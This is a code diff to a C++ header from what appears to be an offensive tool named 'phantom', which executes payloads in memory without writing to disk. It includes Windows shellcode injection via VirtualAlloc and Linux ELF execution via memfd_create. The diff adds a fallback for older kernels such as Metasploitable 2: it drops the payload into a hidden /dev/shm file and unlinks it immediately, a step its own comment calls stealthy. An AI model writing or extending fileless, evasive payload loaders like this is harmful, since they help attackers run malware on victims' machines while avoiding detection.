@@ -4,11 +4,12 @@
 //  ──────────────────────────────────────────────────────────────────────
 //  Executes payloads without writing to disk.
 //  Windows: Shellcode injection via VirtualAlloc.
-//  Linux: Binary execution via memfd_create.
+//  Linux: Binary execution via memfd_create with legacy fallback.
 // ============================================================================
 
 #include <vector>
 #include <string>
+#include <cstdlib>
 
 #ifdef _WIN32
 #include <windows.h>
@@ -49,12 +50,24 @@ inline bool run_shellcode(const std::vector<unsigned char>& shellcode) {
     return true;
 }
 #else
-// Execute ELF Binary on Linux via memfd_create
+// Execute ELF Binary on Linux via memfd_create with fallback to /dev/shm
 inline bool run_binary(const std::vector<unsigned char>& binary, const std::string& args = "") {
     if (binary.empty()) return false;
 
-    // Create an anonymous file in memory
+    // Try to create an anonymous file in memory (Modern Linux, Kernel 3.17+)
     int fd = memfd_create("phantom_mem", MFD_CLOEXEC);
+    
+    // Fallback for older kernels (like Metasploitable 2)
+    if (fd == -1) {
+        char tmp_path[] = "/dev/shm/.phntmXXXXXX";
+        fd = mkstemp(tmp_path);
+        if (fd != -1) {
+            // Unlink immediately: the file remains accessible via the fd 
+            // but is deleted from the directory listing. Stealthy.
+            unlink(tmp_path);
+        }
+    }
+
     if (fd == -1) return false;
 
     // Write binary to the anonymous file
@@ -69,7 +82,6 @@ inline bool run_binary(const std::vector<unsigned char>& binary, const std::stri
         char fd_path[64];
         snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
         
-        // Prepare arguments (very basic)
         execl(fd_path, "phantom_payload", (char*)NULL);
         _exit(1);
     } else if (pid > 0) { // Parent
